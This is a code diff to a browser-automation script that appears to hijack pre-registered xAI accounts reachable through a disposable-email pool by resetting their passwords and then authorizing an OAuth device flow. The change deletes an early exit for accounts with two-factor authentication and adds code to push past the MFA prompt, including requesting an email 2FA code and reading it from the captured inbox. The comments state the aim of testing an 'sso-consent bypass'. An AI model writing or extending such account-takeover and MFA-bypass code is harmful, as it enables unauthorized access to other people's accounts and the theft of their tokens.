@@ -171,9 +171,26 @@ async function deviceFlow(page, ctx, log) {
   log("device click1:", c4);
   await page.waitForTimeout(6000);
   b = await bodyText(page);
-  if (/second factor|verify your account|authenticator app|\bADM\b/i.test(b)) {
-    log("MFA_WALL on consent — cannot complete device flow for MFA'd account");
-    throw new Error("MFA_ACCOUNT");
+  if (/second factor|verify your account|authenticator app|\bADM\b|Google Authenticator|KeePass/i.test(b)) {
+    // MFA wall on consent — log the FULL page text to learn whether the sso
+    // session bypasses it; still attempt the Allow click + token poll below.
+    log("MFA_WALL on consent page — full text:", b.replace(/\s+/g, " ").slice(0, 400));
+    // some accounts may offer EMAIL-based 2FA → code lands in the inbox
+    const e2 = await clickAny(page, ["email", "send code to email", "verify by email", "use email"]);
+    if (e2) {
+      log("clicked email-2FA option:", e2);
+      await page.waitForTimeout(4000);
+      const ec = await enatorWaitCode(email, 10, 10000, new Set());
+      if (ec) {
+        log("email-2FA code:", ec.slice(0, 3) + "-" + ec.slice(3));
+        await page.locator("input").last().fill(ec);
+        await page.waitForTimeout(500);
+        await clickAny(page, ["verify", "continue", "confirm"]);
+        await page.waitForTimeout(5000);
+      } else {
+        log("no email-2FA code arrived");
+      }
+    }
   }
   const c5 = await clickAny(page, ["allow", "authorize", "approve", "yes", "continue"]);
   log("device click2:", c5);
@@ -329,13 +346,12 @@ async function main() {
     log("post-password page:", b.replace(/\s+/g, " ").slice(0, 200));
     if (/blocked|authentication failure/i.test(b)) throw new Error("ACCOUNT_BLOCKED: " + email);
     if (/successful|password.*(reset|changed|updated)|sign in|account/i.test(b)) log("PASSWORD SET OK");
-    // MFA bailout: Emailnator pool accounts are mixed — some have TOTP (ADM)
-    // enrolled. The device-flow consent then requires a 2nd factor we cannot
-    // satisfy → skip fast instead of burning the run on a consent timeout.
+    // MFA note: emailnator dotGmail pool = PRE-REGISTERED xAI accounts, many with
+    // 2FA enrolled (Google Authenticator / KeePassDX / ADM). The sso cookie IS set
+    // by the reset chain — so the OAuth device consent MAY still proceed without a
+    // 2nd factor. Do NOT bail; log and continue so we learn the consent behavior.
     if (/second factor|authenticator app|\bADM\b|contact support/i.test(b)) {
-      console.error("MFA_ACCOUNT: " + email + " has 2FA enrolled — skipping");
-      try { await browser.close(); } catch {}
-      process.exit(3);
+      log("MFA DETECTED (2FA enrolled: " + email + ") — continuing to device flow to test sso-consent bypass");
     }
 
     // ---- 4. session: auto via reset OR sign-in fallback ----
